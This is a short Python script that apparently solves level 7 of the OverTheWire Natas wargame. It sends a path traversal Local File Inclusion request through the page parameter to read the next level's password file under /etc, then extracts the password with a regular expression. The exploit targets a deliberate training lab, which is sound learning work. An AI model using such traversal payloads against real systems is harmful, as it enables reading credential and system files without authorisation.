import requests, re

url="http://natas7.natas.labs.overthewire.org/"
username="natas7"
# read password from generated file
file=open('password.txt', 'r')
password=file.read()

# get the password using Local File Inclusion
lfipath="index.php?page=../../../../etc/natas_webpass/natas8"
lfi=requests.get(url+lfipath, auth=(username, password)).text

# Get the password using regexp
pattern=r'(?<=<br>\n<br>\n)(.*?)(?=\n\n<!-- hint)'
passwd=re.search(pattern, lfi, re.DOTALL)
# print(passwd.group(1).strip())
with open('password.txt', 'w') as f:
    f.write(passwd.group(1).strip())

file.close()